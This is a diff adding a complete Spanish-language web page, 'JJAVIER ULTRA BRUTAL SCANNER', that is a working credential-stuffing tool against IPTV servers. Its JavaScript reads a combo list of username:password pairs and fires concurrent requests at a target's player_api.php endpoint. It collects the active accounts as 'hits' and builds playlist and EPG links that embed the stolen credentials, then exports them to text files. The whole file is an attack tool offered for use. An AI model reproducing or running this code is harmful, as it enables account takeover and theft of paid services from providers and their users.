@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>JJAVIER SCANNER - ULTRA BRUTAL</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --bg: #0a0012;
+            --card: #12001a;
+            --neon-purple: #c300ff;
+            --neon-green: #39ff14;
+            --neon-pink: #ff006e;
+            --text: #f0e6ff;
+            --text-dim: #a78bfa;
+            --danger: #ff2e63;
+            --success: #39ff14;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Roboto Mono', monospace;
+            min-height: 100vh;
+            padding: 12px;
+            background-image: 
+                radial-gradient(circle at 10% 10%, rgba(195,0,255,0.09) 0%, transparent 45%),
+                radial-gradient(circle at 90% 90%, rgba(57,255,20,0.07) 0%, transparent 50%);
+        }
+
+        .container {
+            max-width: 1280px;
+            margin: 0 auto;
+        }
+
+        header {
+            text-align: center;
+            margin: 2rem 0 3rem;
+        }
+
+        h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: clamp(3.2rem, 10vw, 6.5rem);
+            font-weight: 900;
+            letter-spacing: -3px;
+            background: linear-gradient(90deg, var(--neon-purple), var(--neon-green), var(--neon-pink), var(--neon-purple));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 25px rgba(195,0,255,0.7),
+                         0 0 50px rgba(57,255,20,0.5);
+            animation: glitch 5s infinite;
+        }
+
+        .subtitle {
+            color: var(--neon-green);
+            font-size: 1.3rem;
+            letter-spacing: 8px;
+            margin-top: 0.6rem;
+            text-shadow: 0 0 15px var(--neon-green);
+        }
+
+        .glass {
+            background: rgba(18,0,26,0.7);
+            backdrop-filter: blur(14px);
+            -webkit-backdrop-filter: blur(14px);
+            border: 1px solid rgba(195,0,255,0.2);
+            border-radius: 16px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            box-shadow: 0 0 50px rgba(0,0,0,0.7),
+                        inset 0 0 25px rgba(195,0,255,0.1);
+        }
+
+        .controls {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 2rem;
+        }
+
+        label {
+            display: block;
+            color: var(--neon-purple);
+            font-weight: bold;
+            margin-bottom: 0.6rem;
+            font-size: 1rem;
+            letter-spacing: 1.5px;
+        }
+
+        input[type="text"],
+        input[type="file"] {
+            width: 100%;
+            padding: 1rem;
+            background: rgba(8,0,12,0.8);
+            border: 1px solid rgba(195,0,255,0.3);
+            border-radius: 10px;
+            color: var(--text);
+            font-family: inherit;
+            font-size: 1rem;
+            transition: all 0.25s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--neon-green);
+            box-shadow: 0 0 16px rgba(57,255,20,0.5);
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 1.5rem;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 1.2rem;
+            border: none;
+            border-radius: 10px;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-start  { background: linear-gradient(45deg, #00ff9d, #39ff14); color: #000; }
+        .btn-stop   { background: linear-gradient(45deg, #ff2e63, #c300ff); color: white; }
+        .btn-clear  { background: #1a0033; color: #a78bfa; border: 1px solid #5c2d91; }
+        .btn-save   { background: linear-gradient(45deg, #7c3aed, #c300ff); padding: 0.8rem 1.6rem; font-size: 1rem; }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 30px rgba(0,0,0,0.6);
+        }
+
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 12px;
+            margin: 2rem 0;
+        }
+
+        .stat {
+            background: rgba(8,0,12,0.7);
+            padding: 1.2rem;
+            border-radius: 12px;
+            text-align: center;
+            border: 1px solid rgba(195,0,255,0.18);
+        }
+
+        .stat-num {
+            font-size: 2.2rem;
+            font-weight: 900;
+            font-family: 'Orbitron', sans-serif;
+        }
+
+        .stat-lbl {
+            font-size: 0.8rem;
+            color: var(--text-dim);
+            text-transform: uppercase;
+            letter-spacing: 2.5px;
+            margin-top: 6px;
+            display: block;
+        }
+
+        .progress-bar {
+            height: 10px;
+            background: rgba(8,0,12,0.8);
+            border-radius: 5px;
+            overflow: hidden;
+            margin: 1.5rem 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--neon-purple), var(--neon-green), var(--neon-pink));
+            transition: width 0.4s ease;
+        }
+
+        .results-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+            padding-bottom: 1rem;
+            border-bottom: 1px solid rgba(195,0,255,0.2);
+        }
+
+        .results-container {
+            max-height: 55vh;
+            overflow-y: auto;
+            padding-right: 8px;
+        }
+
+        .results-container::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        .results-container::-webkit-scrollbar-thumb {
+            background: var(--neon-purple);
+            border-radius: 4px;
+        }
+
+        .hit-card {
+            background: linear-gradient(145deg, #12001a, #0a0012);
+            border-left: 6px solid var(--neon-green);
+            border-radius: 12px;
+            margin-bottom: 1.2rem;
+            overflow: hidden;
+            box-shadow: 0 6px 25px rgba(0,0,0,0.6);
+            animation: slideIn 0.4s;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(15px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        .hit-head {
+            background: rgba(57,255,20,0.15);
+            padding: 1rem 1.5rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .status-badge {
+            background: var(--neon-green);
+            color: black;
+            padding: 6px 14px;
+            border-radius: 6px;
+            font-weight: bold;
+            font-size: 0.95rem;
+        }
+
+        .copy-btn {
+            background: transparent;
+            border: 1px solid var(--neon-green);
+            color: var(--neon-green);
+            padding: 4px 10px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.85rem;
+        }
+
+        .hit-body {
+            padding: 1.5rem;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.2rem;
+            font-size: 0.95rem;
+        }
+
+        .row {
+            margin-bottom: 0.6rem;
+        }
+
+        .lbl {
+            color: var(--text-dim);
+            font-size: 0.85rem;
+        }
+
+        .val {
+            color: white;
+            font-weight: bold;
+        }
+
+        .categories {
+            grid-column: 1 / -1;
+            display: flex;
+            justify-content: space-around;
+            background: rgba(8,0,12,0.7);
+            padding: 1.2rem;
+            border-radius: 10px;
+            margin-top: 1rem;
+        }
+
+        .cat-item {
+            text-align: center;
+        }
+
+        .cat-num {
+            font-size: 2rem;
+            font-weight: 900;
+            color: var(--neon-purple);
+            text-shadow: 0 0 12px rgba(195,0,255,0.7);
+        }
+
+        .cat-label {
+            font-size: 0.8rem;
+            color: var(--text-dim);
+            text-transform: uppercase;
+            margin-top: 4px;
+        }
+
+        .links-section {
+            grid-column: 1 / -1;
+            margin-top: 1rem;
+            padding-top: 1rem;
+            border-top: 1px solid rgba(195,0,255,0.2);
+            display: flex;
+            flex-direction: column;
+            gap: 0.6rem;
+        }
+
+        .links-section a {
+            color: var(--neon-green);
+            text-decoration: none;
+            font-size: 0.9rem;
+            word-break: break-all;
+        }
+
+        .links-section .lbl {
+            color: var(--text);
+            font-weight: bold;
+            font-size: 0.95rem;
+        }
+
+        @keyframes glitch {
+            0%, 100% { transform: translate(0); }
+            20%  { transform: translate(-4px, 4px); }
+            40%  { transform: translate(4px, -4px); }
+            60%  { transform: translate(-3px, 3px); }
+            80%  { transform: translate(3px, -3px); }
+        }
+
+        @media (max-width: 768px) {
+            .controls { grid-template-columns: 1fr; }
+            .hit-body { grid-template-columns: 1fr; }
+            .btn-group { flex-wrap: wrap; }
+        }
+
+        @media (max-width: 480px) {
+            h1 { font-size: 3.8rem; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <header>
+        <h1>JJAVIER</h1>
+        <div class="subtitle">ULTRA BRUTAL SCANNER</div>
+    </header>
+
+    <div class="glass">
+        <div class="controls">
+            <div>
+                <label>🌐 HOST URL 1 (obligatorio - incluye http:// o https://)</label>
+                <input type="text" id="host" placeholder="http://servidor-iptv.com">
+
+                <div style="margin-top:1.5rem;">
+                    <label>🌐 HOST URL 2 (opcional)</label>
+                    <input type="text" id="host2" placeholder="http://servidor2-iptv.com">
+                </div>
+
+                <div style="margin-top:1.5rem;">
+                    <label>📁 CARGAR COMBO LIST (.txt)</label>
+                    <input type="file" id="combos" accept=".txt">
+                </div>
+            </div>
+
+            <div>
+                <label>⚡ HILOS / THREADS: <span id="concVal" style="color:var(--neon-green)">12</span></label>
+                <input type="range" id="concurrency" min="1" max="60" value="12">
+
+                <div class="btn-group">
+                    <button id="startBtn" class="btn btn-start">INICIAR ATAQUE</button>
+                    <button id="stopBtn"  class="btn btn-stop">DETENER</button>
+                    <button id="clearBtn" class="btn btn-clear">LIMPIAR</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="stats">
+        <div class="stat"><span class="stat-num" id="sTotal">0</span><span class="stat-lbl">TOTAL</span></div>
+        <div class="stat"><span class="stat-num" id="sHits" style="color:var(--success)">0</span><span class="stat-lbl">HITS</span></div>
+        <div class="stat"><span class="stat-num" id="sErrors" style="color:var(--danger)">0</span><span class="stat-lbl">FALLOS</span></div>
+        <div class="stat"><span class="stat-num" id="sSpeed" style="color:var(--neon-green)">0</span><span class="stat-lbl">REQ/S</span></div>
+        <div class="stat"><span class="stat-num" id="sRem">0</span><span class="stat-lbl">RESTANTES</span></div>
+    </div>
+
+    <div class="progress-bar"><div class="progress-fill" id="progFill"></div></div>
+
+    <div class="glass">
+        <div class="results-header">
+            <h3 style="color:var(--neon-green); font-family:'Orbitron'; letter-spacing:2px;">CUENTAS VÁLIDAS</h3>
+            <button id="saveBtn" class="btn btn-save">GUARDAR HITS</button>
+        </div>
+
+        <div class="results-container" id="results"></div>
+    </div>
+</div>
+
+<script>
+    const S = { q: [], active: 0, run: false, processed: 0, hits: 0, err: 0, tot: 0, data: [], speedInt: null, reqs: 0, lastT: Date.now() };
+    const E = id => document.getElementById(id);
+
+    E('concurrency').oninput = e => E('concVal').innerText = e.target.value;
+    E('startBtn').onclick = start;
+    E('stopBtn').onclick = stop;
+    E('clearBtn').onclick = clearAll;
+    E('saveBtn').onclick = saveHits;
+
+    function readFile(file) {
+        return new Promise((resolve, reject) => {
+            const reader = new FileReader();
+            reader.onload = e => resolve(e.target.result);
+            reader.onerror = reject;
+            reader.readAsText(file);
+        });
+    }
+
+    async function start() {
+        if (S.run) return;
+        const file = E('combos').files[0];
+        let host1 = E('host')?.value.trim() || '';
+        let host2 = E('host2')?.value.trim() || '';
+
+        if (!file || (!host1 && !host2)) return alert('¡Carga un combo y pon al menos un host!');
+        if (host1 && !/^https?:\/\//i.test(host1)) host1 = 'http://' + host1;
+        if (host2 && !/^https?:\/\//i.test(host2)) host2 = 'http://' + host2;
+
+        const hosts = [host1];
+        if (host2) hosts.push(host2);
+
+        try {
+            const text = await readFile(file);
+            S.q = text.split('\n').map(l => l.trim()).filter(l => l.includes(':'));
+            if (!S.q.length) return alert('Combo vacío o formato incorrecto');
+
+            S.run = true;
+            S.processed = 0;
+            S.hits = 0;
+            S.err = 0;
+            S.data = [];
+            S.tot = S.q.length * hosts.length;
+
+            E('results').innerHTML = '';
+            updateUI();
+
+            if (S.speedInt) clearInterval(S.speedInt);
+            S.speedInt = setInterval(calculateSpeed, 1000);
+
+            const threads = parseInt(E('concurrency').value);
+            for(let i = 0; i < threads; i++) worker(hosts);
+        } catch(e) {
+            alert('Error al leer el archivo: ' + e.message);
+        }
+    }
+
+    function stop() {
+        S.run = false;
+        clearInterval(S.speedInt);
+        E('sSpeed').innerText = '0';
+    }
+
+    function clearAll() {
+        stop();
+        S.q = [];
+        S.processed = 0;
+        S.hits = 0;
+        S.err = 0;
+        S.data = [];
+        E('results').innerHTML = '';
+        updateUI();
+        E('progFill').style.width = '0%';
+    }
+
+    async function worker(hosts) {
+        if (!S.run) return;
+        S.active++;
+        while (S.q.length && S.run) {
+            const combo = S.q.shift();
+            const [user, ...passParts] = combo.split(':');
+            const pass = passParts.join(':');
+
+            try {
+                const promises = hosts.map(h => checkAccount(h, user, pass).catch(() => ({valid:false})));
+                const results = await Promise.all(promises);
+
+                results.forEach((res, i) => {
+                    const full = { ...res, host: hosts[i] };
+                    if (res.valid) {
+                        S.hits++;
+                        S.data.push(full);
+                        renderHit(full);
+                    } else {
+                        S.err++;
+                    }
+                });
+
+                S.processed += hosts.length;
+                S.reqs += hosts.length;
+            } catch {
+                S.err += hosts.length;
+                S.processed += hosts.length;
+                S.reqs += hosts.length;
+            }
+
+            updateUI();
+        }
+        S.active--;
+        if (S.active === 0 && !S.q.length && S.run) {
+            stop();
+            alert('ESCÁNER FINALIZADO - ¡HITS GUARDADOS!');
+        }
+    }
+
+    async function checkAccount(host, username, password) {
+        const ctrl = new AbortController();
+        const timeout = setTimeout(() => ctrl.abort(), 18000);
+
+        try {
+            const resp = await fetch(`${host}/player_api.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`, {
+                signal: ctrl.signal,
+                headers: { 'Accept': 'application/json' }
+            });
+
+            clearTimeout(timeout);
+            if (!resp.ok) throw new Error('HTTP error');
+
+            const data = await resp.json();
+
+            if (data.user_info?.status === 'Active') {
+                let stats = { live: 0, vod: 0, series: 0, total: 0 };
+
+                let categories = data.categories || data.live_categories || [];
+                if (typeof categories === 'object' && !Array.isArray(categories)) categories = Object.values(categories);
+
+                if (!Array.isArray(categories) || categories.length === 0) {
+                    try {
+                        const [l, v, s] = await Promise.allSettled([
+                            fetch(`${host}/player_api.php?username=${username}&password=${password}&action=get_live_categories`),
+                            fetch(`${host}/player_api.php?username=${username}&password=${password}&action=get_vod_categories`),
+                            fetch(`${host}/player_api.php?username=${username}&password=${password}&action=get_series_categories`)
+                        ]);
+
+                        if (l.status === 'fulfilled' && l.value.ok) stats.live = (await l.value.json()).length || 0;
+                        if (v.status === 'fulfilled' && v.value.ok) stats.vod  = (await v.value.json()).length || 0;
+                        if (s.status === 'fulfilled' && s.value.ok) stats.series = (await s.value.json()).length || 0;
+
+                        stats.total = stats.live + stats.vod + stats.series;
+                    } catch {}
+                } else {
+                    stats.total = categories.length;
+                    stats.live   = categories.filter(c => JSON.stringify(c).toLowerCase().includes('live')).length;
+                    stats.vod    = categories.filter(c => JSON.stringify(c).toLowerCase().match(/movie|vod|film/)).length;
+                    stats.series = categories.filter(c => JSON.stringify(c).toLowerCase().match(/series|serie|tv/)).length;
+                }
+
+                return {
+                    valid: true,
+                    host, username, password,
+                    expires: data.user_info.exp_date ? new Date(data.user_info.exp_date * 1000).toLocaleDateString('es-ES') : '∞ ILIMITADO',
+                    maxconn: data.user_info.max_connections || 1,
+                    stats
+                };
+            }
+            return { valid: false };
+        } catch {
+            clearTimeout(timeout);
+            return { valid: false };
+        }
+    }
+
+    function updateUI() {
+        E('sTotal').innerText  = S.tot;
+        E('sHits').innerText   = S.hits;
+        E('sErrors').innerText = S.err;
+        E('sRem').innerText    = S.q.length;
+        E('progFill').style.width = S.tot > 0 ? ((S.processed / S.tot) * 100) + '%' : '0%';
+    }
+
+    function calculateSpeed() {
+        const now = Date.now();
+        E('sSpeed').innerText = Math.round(S.reqs / ((now - S.lastT) / 1000));
+        S.reqs = 0;
+        S.lastT = now;
+    }
+
+    function renderHit(data) {
+        const el = document.createElement('div');
+        el.className = 'hit-card';
+
+        const txtToCopy = `HOST: ${data.host}\nUSER: ${data.username}\nPASS: ${data.password}\nEXP: ${data.expires}`;
+
+        const m3u     = `${data.host}/get.php?username=${data.username}&password=${data.password}&type=m3u_plus`;
+        const m3u_ts  = `${data.host}:80/get.php?username=${data.username}&password=${data.password}&type=m3u_plus&output=ts`;
+        const xmltv   = `${data.host}/xmltv.php?username=${data.username}&password=${data.password}`;
+
+        el.innerHTML = `
+            <div class="hit-head">
+                <span class="status-badge">VÁLIDO</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText(\`${txtToCopy}\`).then(() => {this.innerText='OK'; setTimeout(()=>this.innerText='COPIAR',1200)})">COPIAR</button>
+            </div>
+            <div class="hit-body">
+                <div>
+                    <div class="row"><span class="lbl">HOST:</span> <span class="val">${data.host}</span></div>
+                    <div class="row"><span class="lbl">USUARIO:</span> <span class="val" style="color:var(--neon-purple)">${data.username}</span></div>
+                    <div class="row"><span class="lbl">CONTRASEÑA:</span> <span class="val" style="color:var(--neon-purple)">${data.password}</span></div>
+                </div>
+                <div>
+                    <div class="row"><span class="lbl">CADUCIDAD:</span> <span class="val" style="color:${data.expires==='∞ ILIMITADO'?'var(--neon-green)':'var(--neon-pink)'}">${data.expires}</span></div>
+                    <div class="row"><span class="lbl">CONEXIONES:</span> <span class="val">${data.maxconn}</span></div>
+                </div>
+
+                <div class="categories">
+                    <div class="cat-item"><div class="cat-num">${data.stats.live}</div><div class="cat-label">LIVE</div></div>
+                    <div class="cat-item"><div class="cat-num">${data.stats.vod}</div><div class="cat-label">VOD</div></div>
+                    <div class="cat-item"><div class="cat-num">${data.stats.series}</div><div class="cat-label">SERIES</div></div>
+                </div>
+
+                <div class="links-section">
+                    <span class="lbl">PLAYLIST M3U:</span><a href="${m3u}" target="_blank">${m3u}</a>
+                    <span class="lbl">PLAYLIST M3U8 (TS):</span><a href="${m3u_ts}" target="_blank">${m3u_ts}</a>
+                    <span class="lbl">EPG XMLTV:</span><a href="${xmltv}" target="_blank">${xmltv}</a>
+                </div>
+            </div>
+        `;
+
+        E('results').prepend(el);
+    }
+
+    function saveHits() {
+        if (!S.data.length) return alert('No hay hits para guardar.');
+
+        const uniqueHosts = [...new Set(S.data.map(d => d.host))];
+        const ts = Date.now();
+
+        uniqueHosts.forEach((host, idx) => {
+            const dataForHost = S.data.filter(d => d.host === host);
+            if (!dataForHost.length) return;
+
+            const safeHost = host.replace(/[^a-zA-Z0-9]/g, '_').substring(0,25);
+            const filename = `JJAVIER_HITS_${safeHost || `Host${idx+1}`}_${ts}.txt`;
+
+            const content = dataForHost.map(d => {
+                const m3u    = `${d.host}/get.php?username=${d.username}&password=${d.password}&type=m3u_plus`;
+                const m3u_ts = `${d.host}:80/get.php?username=${d.username}&password=${d.password}&type=m3u_plus&output=ts`;
+                const epg    = `${d.host}/xmltv.php?username=${d.username}&password=${d.password}`;
+
+                return `\n\n` +
+                `╔════════════════════════════════════╗\n` +
+                `║        JJAVIER ULTRA BRUTAL        ║\n` +
+                `╚════════════════════════════════════╝\n` +
+                `HOST:      ${d.host}\n` +
+                `USUARIO:   ${d.username}\n` +
+                `CONTRASEÑA: ${d.password}\n` +
+                `\n` +
+                `CADUCIDAD: ${d.expires}\n` +
+                `MÁX CONEXIONES: ${d.maxconn}\n` +
+                `\n` +
+                `LIVE:  ${d.stats.live}\n` +
+                `VOD:   ${d.stats.vod}\n` +
+                `SERIES: ${d.stats.series}\n` +
+                `\n` +
+                `M3U:     ${m3u}\n` +
+                `M3U8 TS: ${m3u_ts}\n` +
+                `EPG:     ${epg}\n` +
+                `══════════════════════════════════════\n`;
+            }).join('');
+
+            const blob = new Blob([content], {type: 'text/plain'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            a.click();
+            URL.revokeObjectURL(url);
+        });
+
+        alert(`¡Se generaron ${uniqueHosts.length} archivo(s) con los hits!`);
+    }
+</script>
+
+</body>
+</html>
